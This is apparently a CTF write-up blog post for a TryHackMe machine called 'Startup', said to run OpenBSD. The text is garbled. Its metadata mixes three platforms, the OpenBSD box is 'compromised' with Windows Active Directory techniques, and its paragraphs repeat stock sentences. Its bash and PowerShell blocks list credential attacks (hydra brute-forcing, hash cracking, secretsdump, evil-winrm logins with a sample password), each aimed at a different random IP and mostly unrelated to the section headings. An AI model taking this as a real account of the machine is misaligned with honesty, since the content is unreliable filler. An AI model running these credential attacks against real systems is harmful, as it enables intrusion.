---
TitleSEO: "TryHackMe — Startup (Medium OpenBSD) | ZureFX"
TitlePost: "TryHackMe — Startup (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Startup. Silver Ticket and GPP Password to achieve medium compromise on OpenBSD."
Keywords: "ctf, pwntilldawn, medium"
URL: "https://zurefx.github.io/writeups/htb-startup-659.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-startup-659/"
Date: "2024-06-13"
Tags: "CTF, PwnTillDawn, Medium"
Section: "writeups"
Lang: "en"
main_img: "htb-startup-659"
Permalink: "/writeups/htb-startup-659.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Startup** is rated **Medium** on TryHackMe. It runs **OpenBSD** and the IP address during this analysis was `10.43.12.69`.

### Objectives

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.113.75.198 -u administrator -p 'P@ssw0rd!' --shares
```

The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target.

### Service Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
nmap -sCV -p1521,3306,5986 10.113.178.250 -oN scan.txt
crackmapexec smb 10.113.151.113 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.21.118.244 -u administrator -p 'P@ssw0rd!'
```

Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities.

### SMB Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

```bash
nmap -sCV -p110,587,80 10.30.51.39 -oN scan.txt
```

The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

## Exploitation

### Vulnerability Identification

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions. Authentication bypass was achieved through careful manipulation of the login mechanism.

Key finding: **Pass the Ticket**.

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

### Initial Access

The target system was identified as running a vulnerable version of the service. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.98.6.16
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.110.197.139 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.48.192.231 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.91.129.24/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

### Exploitation

Command injection was possible through unsanitized user input in the search functionality. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.80.117.165 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `GetUserSPNs`
- `evil-winrm`
- `bloodhound`
- `dcomexec`
- `msfvenom`
- `wpscan`

### Key Takeaways

- Silver Ticket
- GPP Password
- Pass the Ticket
- CORS Misconfiguration
